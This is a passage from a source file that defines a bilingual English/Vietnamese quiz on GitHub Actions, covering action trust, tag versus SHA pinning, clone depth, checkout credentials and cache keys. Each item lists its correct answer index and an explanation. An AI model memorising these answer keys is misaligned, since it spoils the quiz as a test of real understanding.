              'Gọi một hàm trong hộp cát, chỉ đọc được những tham số bạn truyền qua <code>with:</code> và ghi được những output nó đã khai trong <code>action.yml</code> của chính nó',
            ),
            B(
              'Running the action inside its own container, isolated from your other steps, which is why an action cannot modify the workspace your build step will read',
              'Chạy action bên trong container của riêng nó, cách ly khỏi các bước khác của bạn, và đó là lý do một action không sửa được thư mục làm việc mà bước dựng của bạn sẽ đọc',
            ),
            B(
              'Copying the action\'s steps into your workflow when the file is parsed, so nothing extra executes and the 11.3% is simply your own steps under another name',
              'Chép các bước của action vào workflow của bạn lúc tệp được đọc, nên không có gì thêm được thực thi và con số 11,3% chỉ là chính các bước của bạn dưới một cái tên khác',
            ),
            B(
              'Downloading somebody else\'s repository and running its code in your job — with the workspace, the network, <code>$GITHUB_PATH</code> and the job\'s token all reachable',
              'Tải kho của người khác về rồi chạy mã của nó TRONG job của bạn — với thư mục làm việc, mạng, <code>$GITHUB_PATH</code> và token của job đều với tới được',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The honest description of the trust model is: <code>uses:</code> is not "call a function", it is "run this program as me". There is no sandbox between a step and the rest of the job. An action can read your checked-out source and modify it before your build step runs; it has unrestricted outbound network, so it can send anything it read anywhere; and it can write to <code>$GITHUB_ENV</code> and <code>$GITHUB_PATH</code>, which changes the environment and the executable lookup path for every later step — meaning it can replace a binary your build calls. The one part that <em>is</em> properly scoped is secrets: an action sees what you put in its <code>with:</code> or <code>env:</code>, not everything you have. That scoping is also why passing a value through <code>with:</code> is safe from shell injection where putting it in <code>run:</code> is not — the action receives it as data, never as script text.',
            'Mô tả trung thực về mô hình tin cậy là: <code>uses:</code> không phải "gọi một hàm", nó là "chạy chương trình này với tư cách của tôi". Không có hộp cát nào giữa một bước và phần còn lại của job. Một action đọc được mã nguồn bạn vừa lấy về và sửa nó TRƯỚC khi bước dựng của bạn chạy; nó có mạng ra ngoài không hạn chế, nên gửi bất cứ thứ gì nó đọc được đi bất cứ đâu; và nó ghi được vào <code>$GITHUB_ENV</code> với <code>$GITHUB_PATH</code>, thứ làm đổi môi trường và đường tìm chương trình cho MỌI bước sau — tức là nó thay được một chương trình mà bản dựng của bạn gọi tới. Phần DUY NHẤT thật sự được khoanh vùng là bí mật: một action chỉ thấy thứ bạn đặt vào <code>with:</code> hay <code>env:</code> của nó, không phải mọi thứ bạn có. Chính phép khoanh vùng ấy cũng là lý do truyền một giá trị qua <code>with:</code> thì an toàn trước phép tiêm shell trong khi đặt nó vào <code>run:</code> thì không — action nhận nó như DỮ LIỆU, không bao giờ như chữ của script.',
          ),
        }),

        // q24 · đáp án 1
        mcq({
          prompt: B(
            'Two facts about one workflow file in this repository:' + code(
              "$ git log -S'actions/checkout@v4' -- .github/workflows/deploy-ghcr.yml\n" +
              '2026-06-18  c4d54ecf   <- lan cuoi cung dong uses: doi\n' +
              '\n' +
              '--- log run ngay 06/07/2026, TEP KHONG DOI ---\n' +
              'Node.js 20 is deprecated. The following actions target Node.js 20\n' +
              'but are being forced to run on Node.js 24: actions/cache@v4,\n' +
              'actions/checkout@v4, actions/setup-node@v4, ... (6 action)',
            ) + 'What does that pair establish?',
            'Hai dữ kiện về một tệp workflow trong kho này:' + code(
              "$ git log -S'actions/checkout@v4' -- .github/workflows/deploy-ghcr.yml\n" +
              '2026-06-18  c4d54ecf   <- lan cuoi cung dong uses: doi\n' +
              '\n' +
              '--- log run ngay 06/07/2026, TEP KHONG DOI ---\n' +
              'Node.js 20 is deprecated. The following actions target Node.js 20\n' +
              'but are being forced to run on Node.js 24: actions/cache@v4,\n' +
              'actions/checkout@v4, actions/setup-node@v4, ... (6 action)',
            ) + 'Cặp dữ kiện ấy xác lập điều gì?',
          ),
          options: [
            B(
              'That the runner image changed underneath the job, which has nothing to do with the actions — the same six warnings would appear for any action on any pin',
              'Rằng ảnh runner đã đổi bên dưới job, chuyện chẳng liên quan gì tới các action — đúng sáu cảnh báo ấy sẽ hiện ra với bất kỳ action nào ở bất kỳ kiểu ghim nào',
            ),
            B(
              '<code>@v4</code> is a MUTABLE tag the maintainer re-points, so the code under a pin changed over eighteen days without a single commit of yours',
              '<code>@v4</code> là một cái thẻ SỬA ĐƯỢC mà người bảo trì trỏ lại, nên mã nằm dưới cái ghim ấy đã đổi suốt mười tám ngày mà không cần một commit nào của bạn',
            ),
            B(
              'That the warning is spurious: a pinned major tag resolves to a frozen release, so the six actions were in fact running the same code they ran on 18 June',
              'Rằng cảnh báo ấy là giả: một thẻ major đã ghim phân giải về một bản phát hành đóng băng, nên sáu action ấy thật ra vẫn chạy đúng đoạn mã chúng đã chạy hôm 18/06',
            ),
            B(
              'That GitHub rewrote the workflow file automatically to keep it current, which is why <code>git log</code> shows no commit while the behaviour changed',
              'Rằng GitHub đã tự động viết lại tệp workflow để giữ nó cập nhật, và đó là lý do <code>git log</code> không hiện commit nào trong khi hành vi thì đổi',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Everybody writes <code>actions/checkout@v4</code> and reads it as a version number. It is a git tag, tags are mutable, and the maintainers re-point them at every new v4.x release deliberately. Eighteen days, no commit, six actions on a different Node runtime — that is a workflow going from green to red with a diff of zero lines. There are three pins and each buys something different: a major tag gets you fixes and behaviour changes for free; a full tag <code>@v4.2.1</code> is immutable by convention but is still a tag and can be force-moved; only a full 40-hex commit SHA names content that no operation can reassign. The honest trade is worth stating: a SHA pin with nobody updating it ages into an unpatched dependency, so SHA pinning plus an updater bot is the workable answer, and pinning without an update mechanism swaps one risk for another. This repository measures 21 of 21 uses on major tags and 0 on SHAs, and the ones to pin first are the nine workflows that read the SSH key.',
            'Ai cũng viết <code>actions/checkout@v4</code> rồi đọc nó như một số phiên bản. Nó là một cái thẻ git, mà thẻ thì SỬA ĐƯỢC, và người bảo trì cố ý trỏ lại chúng ở mỗi bản v4.x mới. Mười tám ngày, không commit nào, sáu action chạy trên một runtime Node khác — đó là một workflow đi từ xanh sang đỏ với một diff dài KHÔNG dòng. Có ba kiểu ghim và mỗi kiểu mua một thứ khác nhau: thẻ major cho bạn các bản vá lẫn các thay đổi hành vi một cách miễn phí; thẻ đầy đủ <code>@v4.2.1</code> bất biến theo quy ước nhưng vẫn là một cái thẻ và vẫn bị đẩy dời được; chỉ một SHA commit 40 ký tự hex mới đặt tên cho NỘI DUNG mà không thao tác nào gán lại được. Sự đánh đổi trung thực đáng nói thẳng: một cái ghim SHA mà chẳng ai cập nhật sẽ già đi thành một phụ thuộc không được vá, nên ghim SHA CỘNG một con bot cập nhật mới là câu trả lời dùng được, còn ghim mà không có cơ chế cập nhật thì chỉ đổi rủi ro này lấy rủi ro kia. Kho này đo được 21 trên 21 lượt dùng ghim bằng thẻ major và 0 ghim bằng SHA, và những cái nên ghim trước là chín workflow đọc tới khoá SSH.',
          ),
        }),

        // q25 · đáp án 2
        mcq({
          prompt: B(
            'Three checkout strategies, measured three times each on this repository (2,515 commits, a 440 MB working tree):' + code(
              'cach                        TB      .git   ca cay  commit\n' +
              '--------------------------------------------------------\n' +
              '--depth 1  (MAC DINH)      8,8s    131M    440M       1\n' +
              'day du (fetch-depth: 0)   10,7s    171M    480M    2515\n' +
              '--filter=blob:none         9,8s    135M    444M    2515',
            ) + 'A job needs the base branch for <code>git diff origin/main...HEAD</code>. What do these numbers argue for?',
            'Ba cách checkout, mỗi cách đo ba lượt trên kho này (2.515 commit, cây làm việc 440 MB):' + code(
              'cach                        TB      .git   ca cay  commit\n' +
              '--------------------------------------------------------\n' +
              '--depth 1  (MAC DINH)      8,8s    131M    440M       1\n' +
              'day du (fetch-depth: 0)   10,7s    171M    480M    2515\n' +
              '--filter=blob:none         9,8s    135M    444M    2515',
            ) + 'Một job cần nhánh gốc để chạy <code>git diff origin/main...HEAD</code>. Các con số này bênh vực điều gì?',
          ),
          options: [
            B(
              'Keeping the default and fetching the base branch in a later step, which costs nothing because the objects are already in the shallow pack',
              'Giữ mặc định rồi fetch nhánh gốc ở một bước sau, cách đó không tốn gì vì các đối tượng vốn đã nằm trong gói nông rồi',
            ),
            B(
              'Keeping the default, because the diff can be computed from the single commit that <code>--depth 1</code> fetches once the merge base is passed explicitly',
              'Giữ mặc định, vì phép diff tính được từ một commit duy nhất mà <code>--depth 1</code> lấy về, chỉ cần truyền merge base một cách tường minh',
            ),
            B(
              'A partial clone — <code>--filter=blob:none</code> buys all 2,515 commits for one second and 4 MB over the shallow default, because content dominates and history is cheap here',
              'Một bản clone TỪNG PHẦN — <code>--filter=blob:none</code> mua trọn 2.515 commit với một giây và 4 MB nhiều hơn mặc định nông, vì nội dung áp đảo còn lịch sử thì rẻ ở kho này',
            ),
            B(
              '<code>sparse-checkout</code>, which is the only option here that fetches the commit graph while leaving the 440 MB working tree on the server',
              '<code>sparse-checkout</code>, lựa chọn duy nhất ở đây lấy được đồ thị commit trong khi để nguyên cây làm việc 440 MB trên máy chủ',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Received wisdom says a shallow clone is a large saving. Measured here, the entire 2,515-commit history costs 1.9 seconds and 40 MB — and the reason is in the numbers: the shallow pack is already 131 MB for one commit, because the working tree is 440 MB of content. Content dominates; history is cheap. So the interesting row is the third: a partial clone takes the full commit graph and fetches file contents on demand, giving you history for +1.0 s and +4 MB, which makes it strictly better than <code>fetch-depth: 0</code> for the changed-files case. Options 1 and 2 both fail on the fact that produced this question: with <code>fetch-depth: 1</code> there is no merge base and no other branch, so <code>git diff origin/main...HEAD</code> dies with <code>unknown revision</code> — the single most common reason a hand-written changed-files step does not work first time. Option 4 misdescribes <code>sparse-checkout</code>, which narrows the tree rather than the history; it is genuinely under-used here, but it answers a different question.',
            'Khôn ngoan truyền miệng bảo rằng clone nông tiết kiệm lớn. Đo ở đây thì trọn bộ lịch sử 2.515 commit tốn 1,9 giây và 40 MB — và lý do nằm ngay trong các con số: gói nông đã 131 MB cho MỘT commit, vì cây làm việc là 440 MB nội dung. Nội dung áp đảo; lịch sử thì rẻ. Nên dòng đáng chú ý là dòng thứ ba: một bản clone từng phần lấy trọn đồ thị commit rồi tải nội dung tệp theo yêu cầu, cho bạn lịch sử với +1,0 giây và +4 MB, khiến nó tốt hơn hẳn <code>fetch-depth: 0</code> cho ca cần danh sách tệp đã đổi. Phương án 1 và 2 đều gãy ở đúng sự thật đã đẻ ra câu hỏi này: với <code>fetch-depth: 1</code> thì không có merge base và không có nhánh nào khác, nên <code>git diff origin/main...HEAD</code> chết với <code>unknown revision</code> — lý do phổ biến nhất khiến một bước changed-files viết tay không chạy được ngay lần đầu. Phương án 4 mô tả sai <code>sparse-checkout</code>, thứ thu hẹp CÂY chứ không thu hẹp lịch sử; nó đúng là đang bị dùng ít ở đây, nhưng nó trả lời một câu hỏi khác.',
          ),
        }),

        // q26 · đáp án 0
        mcq({
          prompt: B(
            'These lines appear in the cleanup phase of every real run that used <code>actions/checkout</code>:' + code(
              '[command]/usr/bin/git config --local --name-only --get-regexp\n' +
              '         http\\.https\\:\\/\\/github\\.com\\/\\.extraheader\n' +
              'http.https://github.com/.extraheader\n' +
              '[command]/usr/bin/git config --local --unset-all\n' +
              '         http.https://github.com/.extraheader',
            ) + 'What are those lines removing, and what is the exposure they imply?',
            'Những dòng này xuất hiện trong pha dọn dẹp của MỌI lần chạy thật có dùng <code>actions/checkout</code>:' + code(
              '[command]/usr/bin/git config --local --name-only --get-regexp\n' +
              '         http\\.https\\:\\/\\/github\\.com\\/\\.extraheader\n' +
              'http.https://github.com/.extraheader\n' +
              '[command]/usr/bin/git config --local --unset-all\n' +
              '         http.https://github.com/.extraheader',
            ) + 'Những dòng ấy đang gỡ cái gì đi, và chúng hàm ý mức phơi bày nào?',
          ),
          options: [
            B(
              'An authentication header that checkout wrote into <code>.git/config</code>: for the whole job every step, and anything those steps invoke, can read it — <code>persist-credentials: false</code> stops it being written',
              'Một header xác thực mà checkout đã ghi vào <code>.git/config</code>: suốt cả job thì mọi bước, và mọi thứ các bước ấy gọi tới, đều đọc được nó — <code>persist-credentials: false</code> ngăn nó được ghi ra',
            ),
            B(
              'A cached credential belonging to the runner image rather than to your job, which is removed after every job so the next tenant of the machine cannot reuse it',
              'Một thông tin đăng nhập đã lưu thuộc về ẢNH RUNNER chứ không thuộc job của bạn, được gỡ sau mỗi job để người thuê máy tiếp theo không dùng lại được',
            ),
            B(
              'The masked form of <code>GITHUB_TOKEN</code>, written so that later steps can push without re-authenticating; removing it is cosmetic because the token expires with the job anyway',
              'Dạng đã che của <code>GITHUB_TOKEN</code>, ghi ra để các bước sau push mà không phải xác thực lại; gỡ nó đi chỉ là hình thức vì dù sao token cũng hết hạn cùng job',
            ),
            B(
              'A proxy configuration that the action installs so that git traffic is routed through GitHub\'s cache, which must be undone before the workspace is archived as an artifact',
              'Một cấu hình proxy mà action cài vào để lưu lượng git đi qua bộ đệm của GitHub, phải gỡ trước khi thư mục làm việc được lưu lại thành artifact',
            ),
          ],
          correct: 0,
          explanation: EX(
            'To fetch the repository, checkout has to authenticate, and the way it does that is by writing an <code>extraheader</code> into the local <code>.git/config</code> of your workspace. The post-step removes it — those two commands are the removal — but for the whole duration of the job the header is on disk and readable by every step in between, and by anything those steps invoke: a build script, a test, a postinstall hook, another action. That is the concrete version of the point that there is no boundary between a step and the rest of the job. Two mitigations exist and both are one line: <code>persist-credentials: false</code> stops the header being written at all, which is correct whenever no later step needs to talk to git, and narrowing <code>permissions:</code> shrinks what the token could do if it were read. Option 3 gets the lifetime argument backwards: "it expires with the job" is exactly the window in which every other step of the job runs.',
            'Để lấy được kho mã, checkout phải xác thực, và cách nó làm việc đó là ghi một <code>extraheader</code> vào tệp <code>.git/config</code> cục bộ trong thư mục làm việc của bạn. Bước post gỡ nó đi — hai câu lệnh ấy chính là phần gỡ — nhưng suốt cả thời lượng của job thì cái header ấy nằm trên đĩa và MỌI bước ở giữa đọc được, cùng với mọi thứ mà các bước ấy gọi tới: một script dựng, một bài test, một hook postinstall, một action khác. Đó là phiên bản cụ thể của luận điểm rằng KHÔNG có ranh giới nào giữa một bước và phần còn lại của job. Hai cách giảm thiểu tồn tại và cả hai dài một dòng: <code>persist-credentials: false</code> ngăn hẳn việc ghi header, đúng đắn mỗi khi không bước nào về sau cần nói chuyện với git, còn siết <code>permissions:</code> thì thu nhỏ thứ mà token làm được nếu nó bị đọc. Phương án 3 lập luận ngược về vòng đời: "dù sao nó cũng hết hạn cùng job" đúng là CÁI CỬA SỔ mà mọi bước khác của job chạy trong đó.',
          ),
        }),

        // q27 · đáp án 1
        mcq({
          prompt: B(
            'This repository has nine copies of one ten-line SSH-setup block, and they have already drifted into two versions differing by three keep-alive lines. Somebody factors the block into a composite action at <code>.github/actions/ssh-vps/action.yml</code>. Which pair of constraints must the rewrite respect?',
            'Kho này có chín bản chép của cùng một khối cài SSH dài mười dòng, và chúng đã trôi thành hai phiên bản khác nhau ở ba dòng giữ-kết-nối. Ai đó rút khối ấy thành một composite action ở <code>.github/actions/ssh-vps/action.yml</code>. Bản viết lại phải tôn trọng cặp ràng buộc nào?',
          ),
          options: [
            B(
              'Every <code>run:</code> may omit <code>shell:</code> because the calling job\'s <code>defaults</code> apply, and <code>secrets.*</code> is inherited automatically from whichever workflow invoked it',
              'Mọi <code>run:</code> được phép bỏ <code>shell:</code> vì <code>defaults</code> của job gọi tới sẽ áp dụng, và <code>secrets.*</code> được thừa hưởng tự động từ workflow nào đã gọi nó',
            ),
            B(
              'Every <code>run:</code> inside it MUST name a <code>shell:</code>, and it cannot read <code>secrets.*</code> at all — the secrets must arrive as declared <code>inputs:</code>',
              'Mọi <code>run:</code> bên trong nó BẮT BUỘC phải nêu <code>shell:</code>, và nó hoàn toàn không đọc được <code>secrets.*</code> — các bí mật phải tới dưới dạng <code>inputs:</code> đã khai báo',
            ),
            B(
              'It must be called at job level with <code>uses:</code> under <code>jobs.&lt;id&gt;</code>, and it gets its own runner, so the calling job needs an artifact to hand it the workspace',
              'Nó phải được gọi ở mức job bằng <code>uses:</code> đặt dưới <code>jobs.&lt;id&gt;</code>, và nó có runner riêng, nên job gọi tới phải dùng artifact để trao thư mục làm việc cho nó',
            ),
            B(
              'It must declare <code>runs.using: node20</code> and ship a compiled entry point, since composite is only a packaging format and the runner still needs JavaScript to execute',
              'Nó phải khai <code>runs.using: node20</code> và đóng gói kèm một điểm vào đã biên dịch, vì composite chỉ là một định dạng đóng gói còn runner vẫn cần JavaScript để thực thi',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Two rules bite immediately when steps are moved into a composite action, and both are the first thing that fails. <code>shell:</code> is mandatory on every <code>run:</code> — omitting it is an error, not a default. And a composite action cannot read the <code>secrets</code> context at all, so secrets have to be passed as inputs; that is better anyway, because the action then declares what it needs. Two more restrictions are worth knowing: a step output inside the action is not automatically an action output (declare it under <code>outputs:</code> referencing the inner step\'s id), and a local <code>uses: ./.github/actions/x</code> requires the repository to be checked out first, so a composite action cannot be the step that runs before checkout. Option 3 describes a reusable workflow, which is the right tool when the repetition is <em>jobs</em> rather than steps — and where the surprise is that without <code>secrets: inherit</code> the called workflow gets empty strings rather than errors.',
            'Hai luật cắn ngay lập tức khi các bước được chuyển vào một composite action, và cả hai đều là thứ hỏng đầu tiên. <code>shell:</code> là BẮT BUỘC trên mọi <code>run:</code> — bỏ nó là một lỗi chứ không phải một mặc định. Và một composite action hoàn toàn không đọc được context <code>secrets</code>, nên bí mật phải được truyền vào dưới dạng input; dù sao thế cũng tốt hơn, vì khi đó action tự KHAI ra thứ nó cần. Hai ràng buộc nữa đáng biết: một output của bước bên trong action không tự động thành output của action (phải khai dưới <code>outputs:</code> có tham chiếu tới id của bước bên trong), và một lời gọi cục bộ <code>uses: ./.github/actions/x</code> đòi kho phải được lấy về trước, nên một composite action không thể là bước chạy TRƯỚC checkout. Phương án 3 mô tả một reusable workflow, thứ mới là công cụ đúng khi phần lặp lại là các JOB chứ không phải các bước — và ở đó điều bất ngờ là thiếu <code>secrets: inherit</code> thì workflow được gọi nhận về các chuỗi RỖNG chứ không phải lỗi.',
          ),
        }),

        /* ── Chương 5 — cache và artifact (5 câu) ─────────────────────────── */

        // q28 · đáp án 3
        mcq({
          prompt: B(
            'Measured on this repository\'s real lockfile — 898 packages, a <code>node_modules</code> of 667 MB across 38,909 files:' + code(
              'npm ci, ~/.npm LANH (khong cache gi)       31.409 ms\n' +
              'npm ci, ~/.npm AM   (= cache: npm)         18.757 ms',
            ) + 'What does the one-line <code>cache: \'npm\'</code> on <code>setup-node</code> actually buy?',
            'Đo trên tệp khoá THẬT của kho này — 898 gói, một <code>node_modules</code> nặng 667 MB gồm 38.909 tệp:' + code(
              'npm ci, ~/.npm LANH (khong cache gi)       31.409 ms\n' +
              'npm ci, ~/.npm AM   (= cache: npm)         18.757 ms',
            ) + 'Dòng <code>cache: \'npm\'</code> một dòng trên <code>setup-node</code> thật ra mua được gì?',
          ),
          options: [
            B(
              'It removes the install step on a cache hit, which is the whole point of the line and why it appears in almost every workflow that installs anything',
              'Nó GỠ BỎ bước cài khi trúng cache, đó là toàn bộ ý nghĩa của dòng ấy và là lý do nó xuất hiện trong gần như mọi workflow có cài đặt gì đó',
            ),
            B(
              'It caches <code>node_modules</code> directly, so nothing has to be rebuilt and the remaining 18.8 seconds are the cache download rather than an install',
              'Nó cache thẳng <code>node_modules</code>, nên không có gì phải dựng lại và 18,8 giây còn lại là lượt tải cache về chứ không phải một lượt cài',
            ),
            B(
              'Nothing measurable on a repository this size: the two figures are within the run-to-run variance, and the saving only appears on much larger dependency trees',
              'Không gì đo được trên một kho cỡ này: hai con số nằm trong biên độ dao động giữa các lần chạy, và khoản tiết kiệm chỉ hiện ra ở những cây phụ thuộc lớn hơn nhiều',
            ),
            B(
              'About 40% of the install — and it does NOT remove it: 18.8 seconds still go into unpacking and linking 38,909 files, because only the network fetch is skipped',
              'Khoảng 40% của bước cài — và nó KHÔNG gỡ bỏ được bước ấy: 18,8 giây vẫn đổ vào việc bung và liên kết 38.909 tệp, vì chỉ có lượt tải qua mạng là được bỏ qua',
            ),
          ],
          correct: 3,
          explanation: EX(
            '31.4 seconds cold, 18.8 warm — a large, cheap win, and the reason the line is near-universal advice. But it does not remove the install step, and expecting "cached dependencies" to mean "no install" is expecting the other 60%. What <code>cache: \'npm\'</code> caches is the package manager\'s download directory, <code>~/.npm</code>, not <code>node_modules</code>; <code>npm ci</code> still deletes and rebuilds the tree, still links, still runs lifecycle scripts. Caching <code>node_modules</code> itself is the obvious next move and it is the argument rather than the answer: measured, it saves a further 4.1 seconds of compute and costs 1.5 to 6.1 seconds of transfer for a 152 MB tarball, which is an optimisation whose sign you cannot predict. And none of it touches the build step, which on the Linux job of the run measured here was 149 of 241 seconds.',
            '31,4 giây lạnh, 18,8 giây ấm — một cú thắng lớn và rẻ, và là lý do dòng ấy gần như là lời khuyên phổ quát. Nhưng nó KHÔNG gỡ bỏ được bước cài, và trông đợi "phụ thuộc đã cache" nghĩa là "không phải cài" là đang trông đợi 60% còn lại. Thứ <code>cache: \'npm\'</code> cache là thư mục tải về của trình quản lý gói, tức <code>~/.npm</code>, chứ không phải <code>node_modules</code>; <code>npm ci</code> vẫn xoá rồi dựng lại cả cây, vẫn liên kết, vẫn chạy các script vòng đời. Tự cache <code>node_modules</code> là nước đi hiển nhiên tiếp theo và nó là một CUỘC TRANH LUẬN chứ không phải một câu trả lời: đo được, nó tiết kiệm thêm 4,1 giây tính toán và tốn 1,5–6,1 giây đường truyền cho một gói nén 152 MB, tức một phép tối ưu mà bạn không đoán trước được DẤU của nó. Và không cái nào trong số đó đụng tới bước dựng, thứ chiếm 149 trên 241 giây của job Linux trong lần chạy đã đo ở đây.',
          ),
        }),

        // q29 · đáp án 2
        mcq({
          prompt: B(
            'A workflow uses <code>key: node-modules</code> with no hash and no platform in it. What happens over many runs, and why?',
            'Một workflow dùng <code>key: node-modules</code> không có hash và không có nền tảng trong đó. Chuyện gì xảy ra qua nhiều lần chạy, và vì sao?',
          ),
          options: [
            B(
              'Each run overwrites the entry with the current contents, so the cache stays current — which is why a constant key is a legitimate choice for a dependency tree that changes rarely',
              'Mỗi lần chạy ghi đè mục ấy bằng nội dung hiện tại, nên cache luôn mới — và vì thế một khoá hằng là lựa chọn chính đáng cho một cây phụ thuộc ít khi đổi',
            ),
            B(
              'GitHub rejects a key with no expression in it, because a cache entry that can never be invalidated would grow against the repository\'s 10 GB allowance without bound',
              'GitHub từ chối một khoá không có biểu thức nào trong đó, vì một mục cache không bao giờ mất hiệu lực được sẽ phình vô hạn so với hạn mức 10 GB của kho',
            ),
            B(
              'Run one saves, and every run after that restores that same entry forever — cache entries CANNOT be overwritten, so a constant key freezes on run one',
              'Lần chạy một LƯU, và mọi lần chạy sau phục hồi đúng mục ấy mãi mãi — mục cache KHÔNG ghi đè được, nên một khoá hằng ĐÔNG CỨNG ở lần chạy một',
            ),
            B(
              'The entry is evicted after every run because a key with no unique component collides with itself, so the workflow pays the upload cost and never gets a hit',
              'Mục ấy bị thu hồi sau mỗi lần chạy vì một khoá không có thành phần duy nhất sẽ tự va vào chính nó, nên workflow trả cái giá tải lên mà không bao giờ trúng',
            ),
          ],
          correct: 2,
          explanation: EX(
            'There is exactly one rule that makes cache design non-obvious, and it is not written prominently anywhere: <b>a cache entry cannot be overwritten.</b> Once a key has been written, that key is closed — the log even says so, "Cache hit occurred on the primary key …, not saving cache". Every other design decision follows from it. A key that never changes gives you a cache that never updates: the workflow gets fast, stays fast, and quietly serves the dependency tree from whenever the cache was first written. The design question, stated once, is that a key should change exactly when the cached content should change and not otherwise — too stable and you serve stale content forever, too volatile and every run misses and saves, paying the upload and collecting nothing. A working key names its contents, includes <code>runner.os</code> so a macOS job cannot restore a Linux tree, and includes a <code>hashFiles</code> over the lockfile.',
            'Có đúng MỘT luật khiến việc thiết kế cache không hiển nhiên, và nó không được viết nổi bật ở đâu cả: <b>một mục cache KHÔNG ghi đè được.</b> Một khi khoá đã được ghi thì khoá ấy đóng lại — chính log cũng nói vậy: "Cache hit occurred on the primary key …, not saving cache". Mọi quyết định thiết kế khác đều chảy ra từ đó. Một cái khoá không bao giờ đổi cho bạn một cái cache không bao giờ cập nhật: workflow nhanh lên, cứ nhanh mãi, và âm thầm phục vụ cái cây phụ thuộc của thời điểm cache được ghi lần đầu. Câu hỏi thiết kế, nói một lần cho xong, là khoá phải đổi ĐÚNG LÚC nội dung được cache cần đổi và không lúc nào khác — quá ổn định thì bạn phục vụ đồ cũ mãi mãi, quá bay biến thì lần chạy nào cũng trượt rồi lại lưu, trả tiền tải lên mà chẳng thu về gì. Một cái khoá chạy được sẽ gọi tên nội dung của nó, có <code>runner.os</code> để một job macOS không phục hồi được cây của Linux, và có một <code>hashFiles</code> trên tệp khoá.',
          ),
        }),

        // q30 · đáp án 1
        mcq({
          prompt: B(
            'A cache step is configured like this. The lockfile has just changed, so the exact key misses and the first <code>restore-keys</code> prefix hits:' + code(
              "key: nextjs-cache-${{ runner.os }}-frontend-lock-${{ hashFiles('frontend/package-lock.json') }}\n" +
              'restore-keys: |\n' +
              '  nextjs-cache-${{ runner.os }}-frontend-lock-\n' +
              '  nextjs-cache-${{ runner.os }}-frontend-',
            ) + 'What does the post step do at the end of the job?',
            'Một bước cache được cấu hình như sau. Tệp khoá vừa đổi, nên khoá chính xác TRƯỢT còn tiền tố <code>restore-keys</code> đầu tiên thì TRÚNG:' + code(
              "key: nextjs-cache-${{ runner.os }}-frontend-lock-${{ hashFiles('frontend/package-lock.json') }}\n" +
              'restore-keys: |\n' +
              '  nextjs-cache-${{ runner.os }}-frontend-lock-\n' +
              '  nextjs-cache-${{ runner.os }}-frontend-',
            ) + 'Bước post làm gì ở cuối job?',
          ),
          options: [
            B(
              'Nothing — a <code>restore-keys</code> hit counts as a hit, so the action reports "not saving cache" exactly as it does on a primary-key hit',
              'Không gì cả — trúng một <code>restore-keys</code> được tính là TRÚNG, nên action báo "not saving cache" y hệt như khi trúng khoá chính',
            ),
            B(
              'Saves a NEW entry under the new primary key — a restore-key hit is still a primary-key MISS, which is how the cache rolls itself forward',
              'LƯU một mục MỚI dưới khoá chính mới — trúng một restore-key vẫn là TRƯỢT khoá chính, và đó là cách cái cache tự lăn về phía trước',
            ),
            B(
              'Overwrites the entry that the restore-key matched, so the older lockfile\'s cache is replaced and the prefix keeps pointing at exactly one entry',
              'Ghi đè lên chính cái mục mà restore-key vừa khớp, nên cache của tệp khoá cũ bị thay thế và tiền tố ấy luôn trỏ vào đúng một mục',
            ),
            B(
              'Deletes the stale entry it restored from, so that the next run misses cleanly rather than restoring content that no longer matches the lockfile',
              'Xoá cái mục cũ mà nó vừa phục hồi từ đó, để lần chạy sau trượt cho sạch chứ không phục hồi nội dung không còn khớp với tệp khoá',
            ),
          ],
          correct: 1,
          explanation: EX(
            'This is the part people miss, and it is what makes <code>restore-keys</code> worth having. A prefix hit gives you partial credit — for a build cache, the previous lockfile\'s entry is still most of the value, because most compiled output is unaffected by one dependency bump. But the primary key still missed, so the post step writes a new entry under the new key, and the cache rolls forward on its own with no maintenance. The rule for when to use it is about correctness rather than speed: <code>restore-keys</code> is right when a stale hit is a speed-up <em>on top of</em> a correct step that still runs, and wrong when a stale hit <em>replaces</em> that step. A build cache tolerates being slightly out of date because the build tool re-checks what it uses; a <code>node_modules</code> cache does not, because restoring the previous lockfile\'s tree and then skipping the install leaves you building against versions your lockfile does not name.',
            'Đây là phần người ta hay bỏ sót, và nó chính là thứ khiến <code>restore-keys</code> đáng có. Một cú trúng tiền tố cho bạn ĐIỂM MỘT PHẦN — với một cache dựng thì mục của tệp khoá trước vẫn còn giữ phần lớn giá trị, vì phần lớn sản phẩm biên dịch không bị ảnh hưởng bởi một cú nâng phụ thuộc. Nhưng khoá chính vẫn TRƯỢT, nên bước post ghi một mục MỚI dưới khoá mới, và cái cache tự lăn về phía trước mà không cần ai bảo trì. Luật về lúc nào nên dùng nó là chuyện ĐÚNG SAI chứ không phải chuyện nhanh chậm: <code>restore-keys</code> đúng khi một cú trúng cũ là phần TĂNG TỐC ĐẶT LÊN TRÊN một bước đúng đắn vẫn đang chạy, và sai khi một cú trúng cũ THAY THẾ luôn bước ấy. Một cache dựng chịu được chuyện hơi cũ vì công cụ dựng tự kiểm lại thứ nó dùng; một cache <code>node_modules</code> thì không, vì phục hồi cây của tệp khoá cũ rồi bỏ luôn bước cài là để bạn dựng trên những phiên bản mà tệp khoá của bạn không hề nêu tên.',
          ),
        }),

        // q31 · đáp án 3
        mcq({
          prompt: B(
            'A green job in this repository printed this in its cleanup phase, and had done so for months:' + code(
              '[warning]Path Validation Error: Path(s) specified in the action\n' +
              '         for caching do(es) not exist, hence no cache is being saved.',
            ) + 'The step\'s key includes <code>runner.os</code> and a <code>hashFiles</code> over the lockfile, and its <code>restore-keys</code> prefix is well chosen. What has been true of that cache step?',
            'Một job ĐANG XANH trong kho này in ra dòng sau ở pha dọn dẹp, và đã in như thế suốt nhiều tháng:' + code(
              '[warning]Path Validation Error: Path(s) specified in the action\n' +
              '         for caching do(es) not exist, hence no cache is being saved.',
            ) + 'Khoá của bước ấy có <code>runner.os</code> và một <code>hashFiles</code> trên tệp khoá, còn tiền tố <code>restore-keys</code> thì chọn rất khéo. Điều gì đã đúng với bước cache đó?',
          ),
          options: [
            B(
              'It saved but could not restore, so every run has been cold; the warning names the restore side and the entry itself is present in the repository\'s cache list',
              'Nó lưu được nhưng không phục hồi được, nên mọi lần chạy đều lạnh; cảnh báo ấy nói về phía phục hồi và bản thân mục cache vẫn có trong danh sách cache của kho',
            ),
            B(
              'The cache exceeded the 10 GB repository ceiling and was evicted, which is what the path-validation wording means when a large entry is pushed out by newer ones',
